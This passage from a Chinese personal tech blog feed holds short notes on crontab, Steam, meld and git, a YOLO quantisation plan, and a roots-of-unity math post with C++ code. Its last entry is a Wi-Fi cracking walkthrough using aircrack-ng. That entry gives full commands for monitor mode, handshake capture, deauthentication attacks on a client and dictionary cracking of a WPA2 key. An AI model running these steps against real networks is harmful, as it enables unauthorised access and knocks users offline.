<p><code>crontab -r</code>可以删除列表中所有任务。可以再删除之前使用<code>crontab -l &gt; temp</code>将任务列表保存，</p>
<h1 id="指定用户">指定用户</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab</span><br><span class="line">    -e      (编辑工作表)</span><br><span class="line">    -l      (列出工作表里的命令)</span><br><span class="line">    -r      (删除工作作)</span><br></pre></td></tr></table></figure>
<p>使用-u即可指定设定的用户，不指定时默认用户为当前用户。</p>
<h1 id="一些问题">一些问题</h1>
<ol type="1">
<li>如果定时任务不能正确执行python，可能因为Python执行文件不是绝对路径</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>steam_linux教程</title>
    <url>/2025/02/22/steam-linux%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="如何在linux上玩windows的游戏">如何在linux上玩windows的游戏</h3>
<p>打开设置， 首先在“interface”一栏中找到“client Beta
participation”，选择steam Beta update， 这个是steam的wine分支<br />
然后在“compatibility”中找到“enable Steam play for all other
title”,这样可以玩其他平台的游戏了</p>
]]></content>
  </entry>
  <entry>
    <title>meld使用技巧</title>
    <url>/2025/02/22/meld%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="meld配置">meld配置</h2>
<ol type="1">
<li>过滤</li>
</ol>
<p>https://gist.github.com/baymaxium/03d93b888469df6a37d1cf78f8913c76</p>
<h2 id="meld版本比较">meld版本比较</h2>
<p>meld不带有版本比较，但是git可以方便的把这个比较启动起来.</p>
<ol type="1">
<li><p>先将git的比较工具设为meld <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global diff.tool meld</span><br></pre></td></tr></table></figure></p></li>
<li><p>比较一个版本时可以使用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git difftool &quot;version1&quot; &quot;version2&quot; -y</span><br></pre></td></tr></table></figure>
但上述比较命令只能一个一个文件的比较，会造成很多麻烦，这里可以使用如下方法
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git difftool -d &quot;version1&quot; &quot;version2&quot;</span><br></pre></td></tr></table></figure></p></li>
</ol>
<p><a
href="https://stackoverflow.com/questions/2006032/view-differences-of-branches-with-meld">参考自</a></p>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>uojp450单位根反演与优化</title>
    <url>/2025/02/22/uojp450%E5%8D%95%E4%BD%8D%E6%A0%B9%E5%8F%8D%E6%BC%94%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="欧拉公式">欧拉公式</h1>
<p><span class="math display">\[
e^{i\theta} = cos(\theta) + i * sin(\theta)
\]</span> 上述表达式成立是根据<span
class="math inline">\(e^{x}\)</span>在0处的泰勒展开得到： <span
class="math display">\[
\begin{matrix}
e^{i\theta} &amp;=&amp; \sum_{j = 0}^{\infty}\frac{(i\theta)^{j}}{j!}\\
&amp;=&amp; \sum_{j = 0}^{\infty}(-1)^{j}\frac{(\theta)^{2j}}{(2j)!} + i
* \sum_{j = 0}^{\infty}(-1)^{j}\frac{(\theta)^{2j + 1}}{(2j+1)!}
\end{matrix}
\]</span></p>
<p>在复平面中<span class="math inline">\(e^{i\theta} = cos(\theta) + i *
sin(\theta)\)</span>可以表示为如下： <img src="fu_ping_mian.png"
alt="fu_ping_mian" /></p>
<p>由这个可知单位根可用来左旋转，因为： <span class="math display">\[
e^{i\beta} * e^{i\theta} = e^{i(\theta + \beta)}
\]</span></p>
<p>也能知道单位根<span
class="math inline">\(w_{n}\)</span>旋转n次为1.</p>
<h1 id="单位根">单位根</h1>
<p>单位根是n次幂为1的复数，通常值为<span class="math inline">\(w_{n} =
e^{\frac{2\pi}{n}i} = cos(\frac{2\pi}{n}) + i *
sin(\frac{2\pi}{n})\)</span></p>
<p>观察根据欧拉公式可知，</p>
<h1 id="单位根反演">单位根反演</h1>
<p>表达式<span
class="math inline">\([d|n]\)</span>表示n能否被d整除，如能整除<span
class="math inline">\([d|n] = 1\)</span>否则<span
class="math inline">\([d|n] = 0\)</span>，单位根反演是表达式<span
class="math inline">\([d|n]\)</span>的一种计算方法。</p>
<p><span class="math display">\[
\left\{\begin{matrix}
[d|n] = \frac{1}{d}\sum^{d - 1}_{i = 0}w_{d}^{in} \\
w_{d}^{i} \ne 1 (i &lt; d)\\
w_{d}^d = 1
\end{matrix}\right.
\]</span></p>
<p>上述表达式的主要利用等比数列求和得到,可见下方变换。</p>
<p><span class="math display">\[
\begin{matrix}
[d|n] &amp;= \frac{1}{d}\sum^{d - 1}_{i = 0}w_{d}^{in} \\
    &amp; = \frac{1}{d}\frac{1 - w_{d}^{nd}}{1 - w_{d}^{n}}
\end{matrix}
\]</span></p>
<p>可以看出，<span class="math inline">\(w_{d}^{d} = 1\)</span>且<span
class="math inline">\(w_{d}^{i} !=
1\)</span>是上式成立的一个条件。满足这个条件的有两个：</p>
<ol type="1">
<li>单位根<span class="math inline">\(w_{d} = sin(\theta) + i *
cos(\theta)\)</span></li>
<li>(在一些特殊情况下才成立)在对质数P的模运算中，利用费马小定理可得到：
<span class="math display">\[
w_{d} = x^{\frac{P - 1}{d}} mod P
\]</span></li>
</ol>
<p>注意,需要满足(P - 1) % d == 0，同时x值要特殊选取，验证所得<span
class="math inline">\(w_{d}\)</span>是否满足： <span
class="math display">\[
\begin{matrix}
w_{d}^{i} \ne 1 (i &lt; d)\\
w_{d}^d = 1
\end{matrix}
\]</span></p>
<h1 id="单位根的应用">单位根的应用</h1>
<h2 id="与生成函数一起使用">1. 与生成函数一起使用</h2>
<h3 id="生成函数简介">生成函数简介</h3>
<p><a
href="https://zhouyifan.net/2019/06/25/recurrence-relation-and-generating-function/">生成函数参考</a></p>
<p>生成函数的目的是为了快速计算常见的一些表达式的和，或者求一些递归关系的通项。例如<span
class="math inline">\(\frac{n!}{a!(n - a)!}\)</span>一些项的和</p>
<h4 id="生成函数">生成函数</h4>
<p>求n个水果的组合方案，满足反感的条件是，“1.
苹果偶数个，2.橘子最多两个，3.香蕉数量是3的倍数，最多一个梨” <span
class="math display">\[
\begin{matrix}
&amp;&amp;(1 + x^2 + x^4 + ... + x^{2i} + ...)(1 + x + x^2)(1 + x^3 +
x^6 + ... + x^{3i} + ...)(1 + x)\\
&amp;=&amp; \frac{1}{1 - x^{2}} \frac{1 - x^{3}}{1 - x}\frac{1}{1 -
x^{3}}(1+x)\\
&amp;=&amp; \frac{1}{(1 - x)^{2}} \\
&amp;=&amp; (x - 1)^{-2}\\
&amp;=&amp; \sum^{\infty}_{i = 0}C_{-2}^{n}x^(n)(-1)^(n + 2) \\
&amp;&amp; // 这里既可以用广义二项式定理，也可已使用先积分再求导，求解项
\\
&amp;=&amp; \sum_{i = 0}^{\infty}(n + 1)x^{n}
\end{matrix}
\]</span></p>
<p><a
href="https://www.cnblogs.com/Asika3912333/p/11406614.html">广义二项式参考</a>
乘起来后，其中n的幂次前系数就是方案数</p>
<p>诀窍就在于，用于累积的量作为x的幂次，乘法过程中，相当于把这些方案的部分进行组合。</p>
<h4 id="指数生成函数">指数生成函数</h4>
<p>如果偶数个方格被涂成红色以及奇数个方格被涂成白色，试确定用红、白、蓝和绿为1行列棋盘的方格着色的方案数:</p>
<p>将格子数作为幂次，观察如下表达式： <span class="math display">\[
(x^{0} + x^{2} + x^{4} + ... + x^{2i} + ...)(x^{1} + x^{3} + x^{5} + ...
+ x^{2i + 1} + ...)
\]</span></p>
<p>对于两项<span class="math inline">\(x^{4} *
x^{5}\)</span>相乘，其代表了拿出4个红色5个白色图砖块，但是之中没有给出方案上数，这种组合的方案数应为$，理由是先将所有砖视为不同则排列数为9!，4个红砖相同则需要除以4!，5个白砖相同除以5!。所以通过改动如下表达式可以得到最终目标。</p>
<p><span class="math display">\[
\begin{matrix}
&amp;&amp;n!(x^{0} + \frac{x^{2}}{2!} + \frac{x^{4}}{4!} + ... +
\frac{x^{2i}}{(2i)!} + ...)(x^{1} + \frac{x^{3}}{3!}+ \frac{x^{5}}{5!} +
... + \frac{x^{2i + 1}}{(2i + 1)!} + ...)\\
&amp;=&amp; n!(\frac{e^{x} + e^{-x}}{2})(\frac{e^{x} - e ^ {-x}}{2})\\
&amp;=&amp; n!(\frac{e^{2x} - e^{-2x}}{4})
\end{matrix}
\]</span> 这样得到<span
class="math inline">\(x^{n}\)</span>前的系数就是我们要求的目标答案</p>
<h3 id="应用uojp450">应用uojp450</h3>
<p>题意 ：
共k个复读机，n个复读机会，每个复读机复读次数是d的倍数有多少中方案,
其中d的范围为[1-3]，答案对19491001取模。</p>
<p>可以知道生成函数如下： <span class="math inline">\(n!((x^{0} + x^{d}
/ d! + \frac{x^{2d}}{2d!} + ... ) ^ k)\)</span>中<span
class="math inline">\(x^{n}\)</span>前面的系数就是答案。为了求表达式，可以使用单位根反演。</p>
<p><span class="math display">\[
\begin{matrix}
&amp;&amp;n!((x^{0} + \frac{x^{d}}{d!} + \frac{x^{2d}}{2d!} + ... ) ^ k)
\\
&amp;=&amp; n!(\sum_{i = 0}^{\infty}(\frac{x^{i}}{i!})[d|i]) \\
&amp;=&amp; n!(\sum_{i = 0}^{\infty}(\frac{x^{i}}{i!})\frac{1}{d}\sum_{j
= 0}^{d - 1}w_{d}^{ij}) \\
&amp;=&amp; n!(\sum_{j = 0}^{d - 1}\sum_{i =
0}^{\infty}(\frac{(xw_{d}^{j})^{i}}{i!})) \\
&amp;=&amp; \frac{n!}{d}(\sum_{j = 0}^{d - 1}e^{w_{d}^{j}x}) \\
\end{matrix}
\]</span> 随后使用泰勒展开求系数即可, 在模运算下，<span
class="math inline">\(w_d\)</span>可以不用复数，而使用取模意义下的单位根反演</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     uojp450.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  11:52  2024.11.10</span></span><br><span class="line"><span class="comment">*   modify time:  11:52  2024.11.10</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">19491001</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">5e5</span> + <span class="number">10</span>;</span><br><span class="line">ll p[maxx];</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">powd</span><span class="params">(ll a,ll b)</span></span>&#123;</span><br><span class="line">	ll ans = <span class="number">1</span>;</span><br><span class="line">	ll temp = a % mod2;</span><br><span class="line">	<span class="keyword">while</span>(b)&#123;</span><br><span class="line">		<span class="keyword">if</span>(b &amp;<span class="number">1</span>)&#123;</span><br><span class="line">				ans = (ans * temp)% mod2;</span><br><span class="line">		&#125;</span><br><span class="line">		temp = (temp * temp) % mod2;</span><br><span class="line">		b/=<span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; maxx;i++)&#123;</span><br><span class="line">		p[i] = (p[i -  <span class="number">1</span>] * i ) % mod2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">C</span><span class="params">(ll n,ll a,ll b = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">	ll ans = p[n];</span><br><span class="line">	<span class="comment">//p[n]/p[a]*p[b]*p[n - a - b];</span></span><br><span class="line">	ans =(ans * <span class="built_in">powd</span>(p[a],mod2 - <span class="number">2</span>)) % mod2;</span><br><span class="line">	ans =(ans * <span class="built_in">powd</span>(p[b],mod2 - <span class="number">2</span>)) % mod2;</span><br><span class="line">	ans =(ans * <span class="built_in">powd</span>(p[n - a - b],mod2 - <span class="number">2</span>)) % mod2;</span><br><span class="line">	<span class="comment">//printf(&quot;C(%lld %lld %lld) = %lld\n&quot;, n,a,b,ans);</span></span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	ll n,k,d;			<span class="comment">// n, k个复读机，d次</span></span><br><span class="line">	ll ans = <span class="number">0</span>;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;k&gt;&gt;d;</span><br><span class="line">	<span class="keyword">if</span>(d == <span class="number">1</span>)&#123;</span><br><span class="line">		ans = <span class="built_in">powd</span>(k,n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(d == <span class="number">2</span>)&#123;</span><br><span class="line">		ll d2 = <span class="built_in">powd</span>(<span class="built_in">powd</span>(<span class="number">2</span>,k), mod2 - <span class="number">2</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= k;i++)&#123;</span><br><span class="line">			ans = (ans + <span class="built_in">C</span>(k,i) * <span class="built_in">powd</span>((<span class="number">2</span> * i - k + mod2) % mod2 ,n)) % mod2;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = (ans * d2) % mod2;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		ll d3 = <span class="built_in">powd</span>(<span class="built_in">powd</span>(<span class="number">3</span>,k), mod2 - <span class="number">2</span>),w = <span class="built_in">powd</span>(<span class="number">3</span>,(mod2 - <span class="number">1</span>) / <span class="number">3</span>);</span><br><span class="line">		cout&lt;&lt;(w * w % mod2)&lt;&lt;endl;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= k;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt;= k - i;j++)&#123;</span><br><span class="line">				ans = (ans + (<span class="built_in">C</span>(k,i, j) * <span class="built_in">powd</span>((i + (w * j) % mod2 + ((((w * w) % mod2) * (k - i - j)) % mod2))%mod2,n) ) % mod2) % mod2;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = (ans * d3) % mod2;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; ans &lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>yolo_quant</title>
    <url>/2025/02/22/yolo-quant/</url>
    <content><![CDATA[<h2 id="试验环境">试验环境</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias quant_=&quot;cd /data_160TB/2018/songzhengxi/haha/test/dt_mqbench_test;conda activate o&quot;</span><br><span class="line">alias yolo_=&quot;cd /data_160TB/2018/songzhengxi/haha/test/yolov5_example;conda activate o&quot;</span><br></pre></td></tr></table></figure>
<h2 id="yolo">yolo</h2>
<h2 id="quant">quant</h2>
<h2 id="实验结果">实验结果</h2>
<h3 id="代码">代码</h3>
<ol type="1">
<li>给出训练曲线 -- 0%</li>
<li>给出量化位数情况 -- 0%</li>
<li>给出量化模型保存方案 -- 0%</li>
<li>统计模型大小 -- 0%</li>
</ol>
<h3 id="实验">实验</h3>
<ol type="1">
<li>与其他量化方法进行对比</li>
<li>本方法做一个消融实验</li>
<li></li>
</ol>
<h3 id="参考资料">参考资料</h3>
<p>https://datawhalechina.github.io/dive-into-cv-pytorch/#/chapter03_object_detection_introduction/3_4
https://start.oneflow.org/oneflow-yolo-doc/tutorials/01_chapter/yolov5_network_structure_analysis.html</p>
<h3 id="目标检测基本流程">目标检测基本流程</h3>
<ol type="1">
<li>训练过程</li>
</ol>
<p>将图片分成多个锚框，锚框在图片中的比例 + 不同的长宽比 +
不同中心点的位置构成了生成锚框的三个要素。如果将目标检测比作做选择题，那么锚框就是选择题的选项，他是一个粗略的备选答案。</p>
<ol type="1">
<li>当前训练中exp35最为优质</li>
</ol>
]]></content>
      <tags>
        <tag>毕业</tag>
      </tags>
  </entry>
  <entry>
    <title>区间dp</title>
    <url>/2025/02/22/%E5%8C%BA%E9%97%B4dp/</url>
    <content><![CDATA[<ol type="1">
<li><p>区间dp涉及到环应该怎么处理</p></li>
<li><p>dp中多元组</p></li>
<li><p>四边形不等式</p></li>
</ol>
]]></content>
      <tags>
        <tag>dp</tag>
      </tags>
  </entry>
  <entry>
    <title>wifi crack</title>
    <url>/2025/02/22/wifi/</url>
    <content><![CDATA[<h1 id="破解wifi">破解wifi</h1>
<p><a href="https://github.com/conwnet/wpa-dictionary">参考</a></p>
<h1 id="wpa-dictionary">wpa-dictionary</h1>
<p>Used for Wi-Fi password cracking | 用于 Wi-Fi 密码破解。</p>
<p>aircrack-ng 爆破wifi密码 - 命令清单</p>
<p>~#airmon-ng start [网卡] //开启monitor模式</p>
<p>~#airodump-ng [网卡] //捕获附件的wifi信息</p>
<p>~#airodump-ng -c [信道]--bssid [路由器MAC] -w [handshake-path]
[网卡]</p>
<p>~#aireplay-ng -0 [攻击次数值] -c [某连接设备MAC] -a [路由器MAC]
[网卡]</p>
<p>~#aircrack-ng -w [字典-path] [破解的目标握手包-path]</p>
<p>~#airmon-ng stop [网卡] //退出monitor模式</p>
<h3 id="linux-篇recommended-推荐">Linux 篇（Recommended | 推荐）</h3>
<p>The Kali distribution already has everything installed | Kali
发行版已经安装了所有东西</p>
<p>Full english instructions at:
https://aircrack-ng.org/doku.php?id=getting_started</p>
<h3 id="install-安装-aircrack-ng">1. Install | 安装 aircrack-ng</h3>
<ul>
<li>On Debian/Ubuntu using apt to install: |
使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install aircrack-ng</span><br></pre></td></tr></table></figure>
<h3 id="view-available-wireless-network-cards-查看可用的无线网卡">2.
View available wireless network cards | 查看可用的无线网卡</h3>
<p>Use the command | 使用命令：<code>airmon-ng</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br></pre></td></tr></table></figure>
<p>The available wifi card is <code>wlp8s0</code> |
根据以上输出，可用的无线网卡为 <code>wlp8s0</code>。</p>
<h3
id="specify-the-wireless-network-card-to-turn-on-the-monitor-mode-指定无线网卡开启监听模式">3.
Specify the wireless network card to turn on the monitor mode |
指定无线网卡开启监听模式。</h3>
<p>使用命令：<code>airmon-ng start &lt;网卡名称&gt;</code></p>
<p>Use the command <code>airmon-ng start wlp8s0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)</span><br><span class="line">		(mac80211 station mode vif disabled for [phy0]wlp8s0)</span><br></pre></td></tr></table></figure>
<p>Now wlp8s0 is available for monitoring as <code>wlp8s0mon</code> |
根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是
<code>wlp8s0mon</code>。</p>
<p>开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。</p>
<p>With the monitor mode active the card can not be used to connect to
any wifi, you have to stop it later to use as a normal card</p>
<h3 id="scan-for-nearby-wireless-networks-扫描附近的无线网络">4. Scan
for nearby wireless networks | 扫描附近的无线网络</h3>
<p>使用命令：<code>airodump-ng &lt;处于监听模式的网卡名称&gt;</code></p>
<p>Use the command <code>airodump-ng wlp8s0mon</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon</span><br><span class="line"></span><br><span class="line"> CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              </span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    </span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  </span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   </span><br></pre></td></tr></table></figure>
<p>这一步会输出两个列表，两个列表不停在刷新。</p>
<p>第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：</p>
<ul>
<li>BSSID: 无线 AP 的硬件地址</li>
<li>PWR: 信号强度，值是负数，绝对值越小表示信号越强</li>
<li>CH: 无线网络信道</li>
<li>ENC: 加密方式，我们要破解的是 WPA2</li>
<li>ESSID: 无线网络的名称</li>
</ul>
<p>第二个列表表示某个无线网络中和用户设备的连接信息：</p>
<ul>
<li>BSSID: 无线 AP 的硬件地址</li>
<li>STATION: 用户设备的硬件地址</li>
</ul>
<p>扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。</p>
<p>这里仅仅是演示，所以列表只保留了一条结果。</p>
<h3 id="使用参数过滤扫描列表确定扫描目标">5.
使用参数过滤扫描列表，确定扫描目标</h3>
<p>使用命令：<code>airodump-ng -w &lt;扫描结果保存的文件名&gt; -c &lt;无线网络信道&gt; --bssid &lt;目标无线 AP 的硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  </span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>刚扫描时看到输出的扫描状态是这样的：<code>CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49</code>。</p>
<p>只有当扫描状态后面出现
<code>][ WPA handshake: 22:47:DA:62:2A:F0</code>
后，我们才拿到拿到进行破解的握手包。</p>
<p>扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。</p>
<p>所以我们可以同时使用 <code>aireplay-ng</code>
对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。</p>
<p>拿到握手包后按 Ctrl-C 结束扫描即可。</p>
<h3 id="使用-aireplay-ng-对目标设备发起攻击">6. 使用 aireplay-ng
对目标设备发起攻击</h3>
<p>使用命令：<code>aireplay-ng -&lt;攻击模式&gt; &lt;攻击次数&gt; -a 无线 AP 硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon</span><br><span class="line">18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6</span><br><span class="line">18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]</span><br><span class="line">18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]</span><br><span class="line">18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>发起攻击后，当 <code>airodump-ng</code> 成功拿到了握手包，使用 Ctrl-C
退出攻击。</p>
<h3 id="使用-aircrack-ng-暴力破解-wi-fi-密码">7. 使用 aircrack-ng
暴力破解 Wi-Fi 密码</h3>
<p>使用命令：<code>aircrack-ng -w 密码字典 &lt;包含握手包的 cap 文件&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap </span><br><span class="line">Opening android-01.cap</span><br><span class="line">Read 675 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening android-01.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line"></span><br><span class="line">      [00:00:00] 12/2492 keys tested (828.33 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 2 seconds                                       0.48%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ 1234567890 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D </span><br><span class="line">                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED </span><br><span class="line">                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 </span><br><span class="line">                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 </span><br><span class="line">                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE </span><br></pre></td></tr></table></figure>
<p>根据以上输出，我们已经破解成功！Wi-Fi
密码是：<code>1234567890</code></p>
<h3 id="无线网卡退出监听模式">8. 无线网卡退出监听模式</h3>
<p>使用命令：<code>airmon-ng stop &lt;处于监听模式的无限网卡名称&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br><span class="line"></span><br><span class="line">		(mac80211 station mode vif enabled on [phy0]wlp8s0)</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="mac-os-篇">MAC OS 篇</h2>
<h3 id="查看网卡名称">1. 查看网卡名称</h3>
<p>在终端中执行 <code>ifconfig</code> 即可查看，通常是 en0</p>
<h3 id="使用-airport-监听无线网络">2. 使用 airport 监听无线网络</h3>
<p>由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport
进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量...</p>
<p>开始扫描，终端中执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan</span><br></pre></td></tr></table></figure>
<p>扫描结果会是这样的：</p>
<table style="width:100%;">
<colgroup>
<col style="width: 14%" />
<col style="width: 14%" />
<col style="width: 14%" />
<col style="width: 14%" />
<col style="width: 14%" />
<col style="width: 14%" />
<col style="width: 14%" />
</colgroup>
<thead>
<tr class="header">
<th>SSID</th>
<th>BSSID</th>
<th>RSSI</th>
<th>CHANNEL</th>
<th>HT</th>
<th>CC</th>
<th>SECURITY (auth/unicast/group)</th>
</tr>
